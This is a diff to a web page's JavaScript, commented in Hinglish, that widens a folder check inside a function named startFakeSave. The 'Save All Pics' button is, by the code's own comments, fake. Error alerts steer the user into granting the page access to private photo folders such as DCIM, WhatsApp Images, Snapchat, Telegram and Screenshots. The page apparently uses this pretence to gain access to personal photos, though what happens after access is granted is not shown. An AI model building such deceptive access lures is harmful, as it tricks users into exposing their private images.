@@ -1603,17 +1603,50 @@
 
         /* FAKE SAVE */
         async function startFakeSave(dirHandle) {
-            // 🔥 1. DCIM CHECK LAGAO YAHAN 🔥
-            if (dirHandle && dirHandle.name.toLowerCase() !== 'dcim') {
-                // Agar folder ka naam DCIM nahi hai, toh error dikhao
-                alert("❌ Error: Please select DCIM folder to download and view photos.");
-                saveAllBtn.disabled = false; // Button wapas enable karo
-                saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
-                releaseWakeLock(); // Agar screen on tha toh off kar do
-                return; // YAHIN RUK JAO! Aage ka fake code mat chalao
+
+            // 🔥 FOLDER VALIDATION LOGIC (WHITELIST) 🔥
+            if (dirHandle) {
+                const folderName = dirHandle.name.toLowerCase();
+
+                // Ye wo important folders hain jahan photos hoti hain
+                const allowedFolders = [
+                    'dcim',               // Camera / Gallery
+                    'pictures',           // General Pictures
+                    'downloads',          // Downloads
+                    'whatsapp images',    // WhatsApp photos
+                    'whatsapp',           // WhatsApp folder
+                    'instagram',          // Instagram saved posts
+                    'screenshots',        // Screenshots
+                    'camera',             // Camera folder
+                    'snapchat',           // Snapchat saved snaps
+                    'telegram',           // Telegram downloads
+                    'facebook',           // Facebook saved photos
+                    'messenger',          // Messenger photos
+                    'saved images',       // Pinterest / Browser saved images
+                    'bluetooth',          // Bluetooth received photos
+                    'viber',              // Viber images
+                    'shareit',            // ShareIt received files
+                    'photo',              // Kuch phones me "Photos" folder
+                    'media',              // General media
+                    'movies'              // Kabhi kabhi videos/photos mix hote hain
+                ];
+
+                // Check karo ki folder allowed hai ya nahi
+                const isAllowed = allowedFolders.some(folder => folderName.includes(folder));
+
+                // Agar allowed list me nahi hai, toh error dikhao
+                if (!isAllowed) {
+                    alert(`❌ Error: Please select a valid photo folder (DCIM, Pictures, Downloads).\n\nAapne galat folder select kiya hai: ${dirHandle.name}`);
+
+                    // UI Reset karo
+                    saveAllBtn.disabled = false;
+                    saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
+                    releaseWakeLock();
+                    return; // Function yahin ruk jayega
+                }
             }
 
-            // Agar DCIM hai, toh aage ka pura code chalega
+            // Agar folder allowed hai (DCIM, Pictures, etc.), toh aage ka code chalega...
             isCancelled = false;
             retryCount = 0;
             fakeDone = 0;
